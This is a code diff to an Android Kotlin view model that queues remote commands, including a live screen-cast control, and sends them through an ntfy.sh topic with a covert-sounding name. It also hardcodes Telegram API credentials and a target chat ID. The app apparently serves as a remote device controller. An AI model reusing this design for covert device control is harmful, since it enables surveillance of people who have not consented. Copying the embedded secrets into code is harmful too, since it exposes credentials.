@@ -54,6 +54,11 @@ import java.util.Locale
 
 data class QueuedCommand(val uiKey: String, val cmd: String, val arg: String)
 
+data class AppSettings(
+    val ntfyUrl: String, val ntfyTopic: String, val serverIp: String, val port: String,
+    val apiId: String, val apiHash: String, val chatId: String
+)
+
 class CoreViewModel(application: Application) : AndroidViewModel(application) {
     
     private val appCtx = application
@@ -124,6 +129,32 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
+    // --- Settings Engine ---
+    fun getSettings(): AppSettings {
+        return AppSettings(
+            ntfyUrl = prefs.getString("ntfyUrl", "https://ntfy.sh") ?: "https://ntfy.sh",
+            ntfyTopic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789") ?: "sys_linker_initial_comm_channel_xyz789",
+            serverIp = prefs.getString("serverIp", "0.0.0.0") ?: "0.0.0.0",
+            port = prefs.getInt("port", 8765).toString(),
+            apiId = prefs.getInt("tdApiId", 25029226).toString(),
+            apiHash = prefs.getString("tdApiHash", "9943012755ea9fab57b4f7e42eeb99c6") ?: "9943012755ea9fab57b4f7e42eeb99c6",
+            chatId = prefs.getLong("tdTargetChatId", 7956541572L).toString()
+        )
+    }
+
+    fun saveSettings(settings: AppSettings) {
+        prefs.edit()
+            .putString("ntfyUrl", settings.ntfyUrl)
+            .putString("ntfyTopic", settings.ntfyTopic)
+            .putString("serverIp", settings.serverIp)
+            .putInt("port", settings.port.toIntOrNull() ?: 8765)
+            .putInt("tdApiId", settings.apiId.toIntOrNull() ?: 25029226)
+            .putString("tdApiHash", settings.apiHash)
+            .putLong("tdTargetChatId", settings.chatId.toLongOrNull() ?: 7956541572L)
+            .apply()
+        ServerCore.log("Core Settings Applied.", true)
+    }
+
     // --- Resilient Queue Engine ---
     private fun monitorNetwork() {
         val connectivityManager = appCtx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -141,7 +172,6 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         _pendingCommands.value = emptySet()
 
         workerJob = viewModelScope.launch(Dispatchers.IO) {
-            // Strictly 3 parallel executors
             repeat(3) {
                 launch {
                     for (task in commandQueue) {
@@ -155,13 +185,12 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     private suspend fun processTask(task: QueuedCommand) {
         var success = false
         while (!success) {
-            // Abort if killed by Kill Switch
             if (!_pendingCommands.value.contains(task.uiKey)) return
 
             isNetworkAvailable.first { it }
             try {
                 val url = prefs.getString("ntfyUrl", "https://ntfy.sh")!!
-                val topic = prefs.getString("ntfyTopic", "default_topic")!!
+                val topic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789")!!
                 val targetUrl = if (url.startsWith("http")) "${url.trimEnd('/')}/$topic" else "https://$url/${topic.trimEnd('/')}"
                 
                 val payload = if (task.arg.isNotBlank()) {
@@ -175,13 +204,12 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                 ServerCore.log("SENT: ${task.cmd}", true)
             } catch (e: Exception) {
                 ServerCore.log("NETWORK DROP: ${task.cmd} paused. Retrying...", false)
-                delay(3000) // Backoff before retry
+                delay(3000)
             }
         }
         _pendingCommands.update { it - task.uiKey }
     }
 
-    // Command API
     fun executeCommand(cmd: String, arg: String = "", uiKey: String = cmd) {
         _pendingCommands.update { it + uiKey }
         commandQueue.trySend(QueuedCommand(uiKey, cmd, arg))
@@ -245,8 +273,6 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         sendLive("live_screen_cast", "stop")
     }
 
-    // ... [KEEP ALL TDLib & TgMessage FUNCTIONS EXACTLY THE SAME] ...
-    
     fun tdLog(msg: String, type: String = "INFO") {
         val time = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
         viewModelScope.launch(Dispatchers.Main) {
@@ -304,8 +330,8 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                                 databaseDirectory = File(appCtx.filesDir, "tdlib").absolutePath
                                 useMessageDatabase = true
                                 useSecretChats = true
-                                apiId = prefs.getInt("tdApiId", 0)
-                                apiHash = prefs.getString("tdApiHash", "")
+                                apiId = prefs.getInt("tdApiId", 25029226)
+                                apiHash = prefs.getString("tdApiHash", "9943012755ea9fab57b4f7e42eeb99c6")
                                 systemLanguageCode = "en"
                                 deviceModel = Build.MODEL
                                 applicationVersion = "1.0"
@@ -317,7 +343,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                         is TdApi.AuthorizationStateWaitPassword -> tdAuthState = TdAuthState.WAIT_PASSWORD
                         is TdApi.AuthorizationStateReady -> {
                             tdAuthState = TdAuthState.READY
-                            tgChatId = prefs.getLong("tdTargetChatId", 0L)
+                            tgChatId = prefs.getLong("tdTargetChatId", 7956541572L)
                             tdLog("Engine Authenticated. Target Chat ID: $tgChatId", "SUCCESS")
                             if (tgChatId != 0L) fetchChatHistory() else tdLog("Target Chat ID is 0. Cannot fetch history.", "WARN")
                         }
